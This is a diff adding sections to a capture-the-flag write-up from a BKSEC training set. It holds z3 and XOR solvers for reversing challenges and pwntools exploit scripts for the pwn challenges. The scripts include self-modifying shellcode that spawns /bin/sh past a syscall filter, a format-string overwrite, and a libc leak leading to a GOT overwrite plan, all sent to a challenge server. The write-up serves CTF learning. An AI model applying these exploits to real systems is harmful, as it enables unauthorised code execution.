@@ -1,3 +1,23 @@
+- [Reverse Engineer](#reverse-engineer)
+  - [BabyRust0](#babyrust0)
+  - [pyxe](#pyxe)
+  - [babylua](#babylua)
+  - [ChildRust](#childrust)
+- [Pwn](#pwn)
+  - [Introduction to pwntools](#introduction-to-pwntools)
+  - [bof\_1](#bof_1)
+  - [bof\_2](#bof_2)
+  - [bof\_3](#bof_3)
+  - [int\_1](#int_1)
+  - [bof\_4](#bof_4)
+  - [shell\_1](#shell_1)
+  - [index\_1](#index_1)
+  - [ret2libc](#ret2libc)
+    - [Stage 1: Leak libc address.](#stage-1-leak-libc-address)
+    - [Stage 2: Spawn shell](#stage-2-spawn-shell)
+  - [fmt\_1](#fmt_1)
+  - [fmt\_2](#fmt_2)
+
 # Reverse Engineer
 
 ## BabyRust0
@@ -399,10 +419,322 @@ Flag: `BKSEC{py3-2-3xe_2024_12_29_ok}`
 
 Decompile lua precompiled code using `https://lua-bytecode.github.io/`. Then I use Gemini Pro to reverse `flag.lua`.
 
+```py
+# 1. Mảng dữ liệu mã hóa (lấy từ bytecode flag.lua)
+target = [
+    22, 101, 133, 137, 79, 75, 166, 157, 189, 57, 
+    172, 155, 144, 91, 137, 222, 52, 144, 211, 101, 
+    114, 116, 121, 76, 154, 168, 83, 94
+]
+
+# 2. Key lấy từ file main.lua
+KEY_STR = "ThisIsAFlag"
+key_bytes = [ord(c) for c in KEY_STR]
+key_len = len(key_bytes)
+
+def solve():
+    flag_out = []
+    
+    # --- Bước 1: Giải mã ký tự đầu tiên ---
+    # Công thức: Target[0] = Flag[0] ^ Key[0]
+    # Suy ra:    Flag[0] = Target[0] ^ Key[0]
+    
+    first_char = target[0] ^ key_bytes[0]
+    flag_out.append(first_char)
+    
+    # --- Bước 2: Giải mã các ký tự tiếp theo ---
+    # Công thức xuôi: Target[i] = (Flag[i] ^ Key[i]) + Flag[i-1]
+    # Công thức ngược:
+    #   1. Trừ đi ký tự flag trước đó: temp = Target[i] - Flag[i-1]
+    #   2. Xử lý tràn số (modulo 256): temp = temp % 256
+    #   3. XOR với Key: Flag[i] = temp ^ Key[i]
+    
+    for i in range(1, len(target)):
+        # Lấy byte của Key tương ứng (lặp lại nếu key ngắn hơn)
+        k = key_bytes[i % key_len]
+        
+        # Lấy ký tự Flag đã giải mã ở bước trước
+        prev_flag_char = flag_out[i-1]
+        
+        # Tính toán ngược
+        val_minus = target[i] - prev_flag_char
+        val_xor = val_minus % 256  # Quan trọng: xử lý số âm
+        current_flag_char = val_xor ^ k
+        
+        flag_out.append(current_flag_char)
+        
+    # Chuyển mảng số thành chuỗi
+    return "".join(chr(c) for c in flag_out)
+
+if __name__ == "__main__":
+    try:
+        flag = solve()
+        print(f"[*] Key: {KEY_STR}")
+        print(f"[+] FOUND FLAG: {flag}")
+    except Exception as e:
+        print(f"Lỗi: {e}")
+```
+
 Flag: `BKSEC{ju$t_h@rd3r_2_re@d_:P}`
 
 Refers to this gemini chat: `https://gemini.google.com/share/aa871c799aee`
 
+## ChildRust
+
+Use IDA Pro, we need to decrypt the `check_flag()` function. Cuz I have no idea so I let Gemini do the hard work for me.
+
+Take a look at `check_flag()`. We can use `z3-solver` to decrypt and get the flag.
+
+```python
+from z3 import *
+
+
+def solve():
+    s = Solver()
+
+    # 1. Khởi tạo biến: Flag có độ dài 25 bytes (dựa trên check len != 25)
+    # flag[i] đại diện cho a1[i]
+    flag = [BitVec(f"flag_{i}", 8) for i in range(25)]
+
+    # Hàm trợ giúp: Mở rộng 8-bit lên 32-bit để tính toán không bị tràn sai logic
+    def E(x):
+        return ZeroExt(24, x)
+
+    # 2. Ràng buộc cơ bản: Flag phải là ký tự in được (ASCII printable)
+    # Điều này giúp giảm không gian tìm kiếm và tránh rác
+    for i in range(25):
+        s.add(flag[i] >= 32)
+        s.add(flag[i] <= 126)
+
+    # =================================================================
+    # 3. Dịch logic từ code Decompile sang Z3
+    # =================================================================
+
+    # Mapping biến để dễ đối chiếu code: a1[i] -> flag[i]
+    # Lưu ý: Code gốc dùng biến trung gian v..., ta sẽ viết biểu thức trực tiếp
+    # hoặc gán biến python tương ứng (đã mở rộng lên 32-bit).
+
+    # Block 1
+    # v67 = a1[8];
+    # v66 = *a1 * v67; -> flag[0] * flag[8]
+    # v2 = a1[7];
+    # if ( ((v2 + v66) & a1[1]) != 0x4B ) return 0;
+    v66 = E(flag[0]) * E(flag[8])
+    v2 = E(flag[7])
+    s.add(((v2 + v66) & E(flag[1])) == 0x4B)
+
+    # Block 2
+    # v65 = a1[16]; v3 = a1[6];
+    # v64 = a1[14]; v63 = a1[2];
+    # v62 = a1[10] * v63;
+    # if ( ((v64 - v62) ^ (v65 - v3)) != 0x182B ) return 0;
+    v65, v3 = E(flag[16]), E(flag[6])
+    v64, v63 = E(flag[14]), E(flag[2])
+    v62 = E(flag[10]) * v63
+    s.add(((v64 - v62) ^ (v65 - v3)) == 0x182B)
+
+    # Block 3
+    # v61 = a1[11];
+    # v60 = a1[7] * v61;
+    # v4 = a1[13];
+    # if ( ((v60 - v4) ^ a1[4]) != 0x12B3 ) return 0;
+    v61 = E(flag[11])
+    v60 = E(flag[7]) * v61
+    v4 = E(flag[13])
+    s.add(((v60 - v4) ^ E(flag[4])) == 0x12B3)
+
+    # Block 4
+    # v59 = *a1;
+    # v58 = a1[17] * v59;
+    # v5 = a1[17];
+    # if ( v5 + v58 != 3417 ) return 0;
+    v59 = E(flag[0])
+    v58 = E(flag[17]) * v59
+    v5 = E(flag[17])
+    s.add(v5 + v58 == 3417)
+
+    # Block 5
+    # v57 = a1[5]; v6 = a1[1];
+    # if ( ((v57 - v6) ^ (unsigned __int8)(a1[14] & a1[6])) != 0x40 ) return 0;
+    v57, v6 = E(flag[5]), E(flag[1])
+    # a1[14] & a1[6] trả về byte, cast không ảnh hưởng giá trị nhỏ này
+    s.add(((v57 - v6) ^ (E(flag[14]) & E(flag[6]))) == 0x40)
+
+    # Block 6
+    # v56 = a1[9]; v55 = a1[9]; v7 = *a1;
+    # check 1: ((v55 - v7) ^ (a1[11] * v56) & a1[7]) != 0x1E
+    # check 2: (unsigned __int8)(a1[17] & (*a1 ^ a1[6])) != 0x31
+    v56 = E(flag[9])
+    v55, v7 = E(flag[9]), E(flag[0])
+    # Lưu ý độ ưu tiên: * cao hơn &
+    part1 = (v55 - v7) ^ ((E(flag[11]) * v56) & E(flag[7]))
+    s.add(part1 == 0x1E)
+
+    part2 = E(flag[17]) & (E(flag[0]) ^ E(flag[6]))
+    s.add(part2 == 0x31)  # 0x31 hex là 49 decimal
+
+    # Block 7
+    # v54 = a1[17]; v8 = a1[6];
+    # if ( (a1[9] ^ (v8 + v54)) != 0xF6 ) return 0;
+    v54, v8 = E(flag[17]), E(flag[6])
+    s.add((E(flag[9]) ^ (v8 + v54)) == 0xF6)
+
+    # Block 8
+    # v53 = a1[14];
+    # v52 = (a1[4] * v53) ^ a1[6];
+    # v51 = a1[4];
+    # v50 = a1[7] * v51;
+    # if ( v52 - v50 != 4680 ) return 0;
+    v53 = E(flag[14])
+    v52 = (E(flag[4]) * v53) ^ E(flag[6])
+    v51 = E(flag[4])
+    v50 = E(flag[7]) * v51
+    s.add(v52 - v50 == 4680)
+
+    # Block 9 (Cẩn thận số âm)
+    # v49 = a1[16]; v9 = a1[6];
+    # v48 = v49 - v9;
+    # v47 = a1[7];
+    # v10 = a1[17] & (a1[12] * v47);
+    # if ( v48 - v10 != -36 ) return 0;
+    v49, v9 = E(flag[16]), E(flag[6])
+    v48 = v49 - v9
+    v47 = E(flag[7])
+    v10 = E(flag[17]) & (E(flag[12]) * v47)
+    # Trong Z3 bitvec 32 bit, -36 sẽ là 0xFFFFFFDC. Z3 tự xử lý wrap-around 2's complement
+    s.add(v48 - v10 == -36)
+
+    # Block 10 (Số âm tiếp)
+    # v46 = a1[7]; v45 = a1[12];
+    # v44 = a1[15] * v45;
+    # v43 = v46 - v44;
+    # v11 = a1[6];
+    # if ( v43 - v11 != -10706 ) return 0;
+    v46, v45 = E(flag[7]), E(flag[12])
+    v44 = E(flag[15]) * v45
+    v43 = v46 - v44
+    v11 = E(flag[6])
+    s.add(v43 - v11 == -10706)
+
+    # Block 11
+    # v42 = a1[9]; v41 = a1[7];
+    # v40 = a1[3] * v41;
+    # v39 = v40 + v42;
+    # v12 = a1[2];
+    # if ( v12 + v39 != 3544 ) return 0;
+    v42, v41 = E(flag[9]), E(flag[7])
+    v40 = E(flag[3]) * v41
+    v39 = v40 + v42
+    v12 = E(flag[2])
+    s.add(v12 + v39 == 3544)
+
+    # Block 12
+    # v38 = a1[14]; v13 = a1[10];
+    # v37 = v13 + v38;
+    # v14 = a1[13];
+    # if ( (a1[13] ^ (v37 - v14)) != 0x3A ) return 0;
+    v38, v13 = E(flag[14]), E(flag[10])
+    v37 = v13 + v38
+    v14 = E(flag[13])
+    s.add((E(flag[13]) ^ (v37 - v14)) == 0x3A)
+
+    # Block 13
+    # v36 = a1[14] ^ a1[7] ^ a1[5];
+    # v15 = a1[8];
+    # if ( v15 + v36 != 159 ) return 0;
+    v36 = E(flag[14]) ^ E(flag[7]) ^ E(flag[5])
+    v15 = E(flag[8])
+    s.add(v15 + v36 == 159)
+
+    # Block 14
+    # v35 = (unsigned __int8)(a1[4] & a1[9]);
+    # v16 = a1[11];
+    # v34 = v35 - v16;
+    # v17 = a1[2];
+    # if ( v17 + v34 != 46 ) return 0;
+    v35 = E(flag[4]) & E(flag[9])
+    v16 = E(flag[11])
+    v34 = v35 - v16
+    v17 = E(flag[2])
+    s.add(v17 + v34 == 46)
+
+    # Block 15
+    # v33 = a1[6]; v18 = a1[3];
+    # v32 = v33 - v18;
+    # v19 = a1[6];
+    # if ( v19 + v32 != 161 ) return 0;
+    v33, v18 = E(flag[6]), E(flag[3])
+    v32 = v33 - v18
+    v19 = E(flag[6])
+    s.add(v19 + v32 == 161)
+
+    # Block 16
+    # v31 = a1[8]; v30 = a1[2];
+    # v29 = a1[9] * v30;
+    # v28 = a1[6]; v20 = a1[9];
+    # if ( ((v20 + v28) ^ (v29 + v31)) != 0x1A9E ) return 0;
+    v31, v30 = E(flag[8]), E(flag[2])
+    v29 = E(flag[9]) * v30
+    v28, v20 = E(flag[6]), E(flag[9])
+    s.add(((v20 + v28) ^ (v29 + v31)) == 0x1A9E)
+
+    # Block 17
+    # v27 = a1[15]; v26 = a1[16] * v27;
+    # v21 = a1[16]; v25 = v21 + v26;
+    # v22 = a1[4];
+    # if ( v25 - v22 != 12815 ) return 0;
+    v27 = E(flag[15])
+    v26 = E(flag[16]) * v27
+    v21 = E(flag[16])
+    v25 = v21 + v26
+    v22 = E(flag[4])
+    s.add(v25 - v22 == 12815)
+
+    # Block 18
+    # v24 = a1[6];
+    # check 1: ((a1[16] * v24) & *a1 ^ (unsigned __int8)(a1[1] & a1[3])) != 0x43
+    # check 2: (a1[11] ^ a1[2] ^ a1[8]) != 0x5B
+    v24 = E(flag[6])
+    part1 = ((E(flag[16]) * v24) & E(flag[0])) ^ (E(flag[1]) & E(flag[3]))
+    s.add(part1 == 0x43)
+
+    part2 = E(flag[11]) ^ E(flag[2]) ^ E(flag[8])
+    s.add(part2 == 0x5B)
+
+    # Block 19: Hardcoded checks cuối chuỗi
+    # a1[18] != 115, a1[19] != 53 ...
+    s.add(flag[18] == 115)  # 's'
+    s.add(flag[19] == 53)  # '5'
+    s.add(flag[20] == 49)  # '1'
+    s.add(flag[21] == 48)  # '0'
+    s.add(flag[22] == 110)  # 'n'
+    s.add(flag[23] == 83)  # 'S'
+    s.add(flag[24] == 125)  # '}'
+
+    # =================================================================
+    # 4. Kiểm tra và in kết quả
+    # =================================================================
+    print("[*] Checking constraints...")
+    if s.check() == sat:
+        m = s.model()
+        result = []
+        for i in range(25):
+            val = m[flag[i]].as_long()
+            result.append(chr(val))
+
+        final_flag = "".join(result)
+        print(f"[+] Found FLAG: {final_flag}")
+    else:
+        print("[-] Unsatisfiable. Check constraints.")
+
+
+if __name__ == "__main__":
+    solve()
+```
+
+Flag: `BKSEC{s1mPLe_expr3s510nS}`
+
+Reference: `https://gemini.google.com/share/337ef325b122`
 
 # Pwn
 
@@ -895,6 +1227,74 @@ if ( *(_WORD *)&s[i] == 1295 )
 
 So the idea is using **self-modifying code**. Honestly I'm not really understand these shellcode.
 
+```py
+from pwn import *
+
+context.arch = "amd64"
+
+# Shellcode sử dụng Label để tính địa chỉ chính xác
+shellcode_asm = """
+    /* --- Setup execve("/bin/sh", 0, 0) --- */
+    /* Bước 1: Đẩy chuỗi /bin/sh vào stack */
+    mov rax, 0x68732f6e69622f   /* "/bin/sh\x00" (đã đảo ngược little endian) */
+    push rax
+    mov rdi, rsp                /* RDI trỏ vào chuỗi */
+
+    /* Bước 2: Setup RSI và RDX bằng 0 */
+    xor rsi, rsi
+    xor rdx, rdx
+
+    /* Bước 3: Setup RAX = 59 (syscall execve) */
+    push 59
+    pop rax
+
+    /* --- PHẦN QUAN TRỌNG: BYPASS FILTER --- */
+    
+    /* Dùng Label 'byte_can_sua' để lấy địa chỉ chính xác của byte 0x04.
+       Trình biên dịch sẽ tự thay thế [rip + byte_can_sua] bằng offset đúng.
+    */
+    lea rbx, [rip + byte_can_sua]
+    
+    /* Tăng giá trị tại địa chỉ đó lên 1 đơn vị (0x04 -> 0x05) */
+    inc byte ptr [rbx]
+
+    /* Mã máy tại đây: 0x0f 0x04 */
+    .byte 0x0f
+    
+byte_can_sua:
+    .byte 0x04   /* Đây là byte sẽ bị sửa thành 0x05 khi chạy */
+"""
+
+payload = asm(shellcode_asm)
+
+# --- KIỂM TRA LỖI PHỔ BIẾN ---
+
+# 1. Kiểm tra Bad Characters (0x0a - Newline)
+# Vì hàm main dùng fgets(), nếu payload chứa byte \x0a, nó sẽ bị cắt cụt -> CRASH
+if b"\n" in payload:
+    print("[-] CẢNH BÁO: Payload chứa byte xuống dòng (0x0a)!")
+    print("    fgets sẽ dừng đọc sớm. Shellcode bị hỏng.")
+    # In ra hex để xem byte 0a nằm ở đâu
+    print(hexdump(payload))
+    exit()
+
+# 2. Kiểm tra lại xem có dính syscall gốc không
+if b"\x0f\x05" in payload:
+    print("[-] Vẫn dính syscall 0f 05!")
+    exit()
+
+print(f"[+] Payload length: {len(payload)} bytes")
+print("[+] Payload clean. Sending...")
+
+# Gửi payload (Thay đổi process hoặc remote tùy môi trường của bạn)
+# p = process("./shell_1")
+p = remote("103.77.175.40", 6071)
+
+# p.sendlineafter(b"max 256 bytes):\n", payload)
+p.sendline(payload)
+p.interactive()
+```
+
 ![alt text](image-9.png)
 
 Flag: `BKSEC{sHe_5ell_seA_sh3ll}`
@@ -1052,3 +1452,161 @@ p.interactive()
 ![alt text](image-11.png)
 
 Flag: `BKSEC{buff3t_0verfl0w_supppper_Ezz}`.
+
+## fmt_1
+Basic file information:
+
+```bash
+$ file fmt_1
+fmt_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=751e77c7fbc2c9faffd29532e58cbe2cb682f148, for GNU/Linux 3.2.0, not stripped
+```
+```bash
+$ pwn checksec fmt_1
+[*] '/mnt/e/ctf-chall/bksec_training/pwn/fmt_1/fmt_1'
+    Arch:       amd64-64-little
+    RELRO:      No RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Decompile using IDA Pro:
+
+```c
+unsigned __int64 vuln()
+{
+  _BYTE buf[520]; // [rsp+0h] [rbp-210h] BYREF
+  unsigned __int64 v2; // [rsp+208h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  setbuf(_bss_start, 0LL);
+  puts("What do you want to say?");
+  read(0, buf, 512uLL);
+  printbuffer(buf);                             // format string vuln
+  if ( target == 1869768040 )
+    win();
+  else
+    puts("You are not a hero.");
+  return v2 - __readfsqword(0x28u);
+}
+```
+
+We exploit format string vuln to overwrite `target` to `1869768040` so we can access `win()`.
+
+First I need to find the offset from `printf` to `buf`. I manually find it.
+
+![alt text](image-16.png)
+
+The offset is `10`.
+
+Since `PIE` is off. I don't need to find base address. Now I write a script to exploit.
+
+```py
+from pwn import *
+
+exe = ELF("./fmt_1")
+context.binary = exe
+
+# p = process(exe.path)
+p = remote("103.77.175.40", 6101)
+
+target_addr = exe.sym["target"]
+target_val = 0x6F726568
+offset = 10
+log.info(hex(target_addr))
+
+payload = fmtstr_payload(offset, {target_addr: target_val})
+
+log.info(f"Format string payload: {payload}")
+
+p.sendline(payload)
+p.interactive()
+```
+
+This is the first time i use `fmtstr_payload`. Very convenient. Just provide it with `offset`, `target_address` and `wanted_value` and it will generate payload for us. But we need to provide it `context.binary`.
+
+Format string payload: `b'%104c%16$lln%7c%17$hhnccc%18$hhn%243c%19$hhnaaaa\xa44@\x00\x00\x00\x00\x00\xa74@\x00\x00\x00\x00\x00\xa64@\x00\x00\x00\x00\x00\xa54@\x00\x00\x00\x00\x00'`
+
+![alt text](image-14.png)
+
+Flag: `BKSEC{a_H3r0_w4S_r4iS3d}`
+
+Reference: `https://gemini.google.com/share/b8f0d65be73a`
+
+## fmt_2
+Basic information:
+
+```bash
+$ file fmt_2
+fmt_2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b37d35bdad8167493ebdd229e89ceb089367fe27, for GNU/Linux 3.2.0, not stripped
+```
+```bash
+$ pwn checksec fmt_2
+[*] '/mnt/e/ctf-chall/bksec_training/pwn/fmt_2/fmt_2'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Still no `PIE` enabled.
+
+First I need to leak the libc address.
+
+Use `gdb` to find libc version.
+
+![alt text](image-19.png)
+
+```py
+from pwn import *
+
+context.binary = exe = ELF("./fmt_2", checksec=False)
+
+# p = process(exe.path)
+p = remote("103.77.175.40", 6111)
+
+# Leak libc
+p.sendlineafter(b"Do you have anything to tell us?: ", b"%13$p,%33$p")
+p.recvuntil(b"You said: ")
+# leaked_libc = int(p.recvline()[:-1], 0)
+leaked_libc = p.recvline().split(b",")
+__libc_start_call_main_ret = int(leaked_libc[0], 0)
+log.info(hex(__libc_start_call_main_ret))
+```
+
+Output
+
+```bash
+$ python exploit.py
+[+] Opening connection to 103.77.175.40 on port 6111: Done
+[*] 0x7dc59ab2e1ca
+[*] Closed connection to 103.77.175.40 port 6111
+```
+
+Found `libc`.
+
+![alt text](image-20.png)
+
+Patch binary using `pwninit`.
+
+Now come the main idea. We need to overwrite `GOT`. `GOT` contains the address of libc function like `puts`, `printf`, `fgets`.
+
+Example:
+
+```c
+printf("/bin/bash")
+```
+
+If we can overwrite `GOT` to change `printf` to `system`, the program become.
+
+```c
+system("/bin/bash")
+```
+
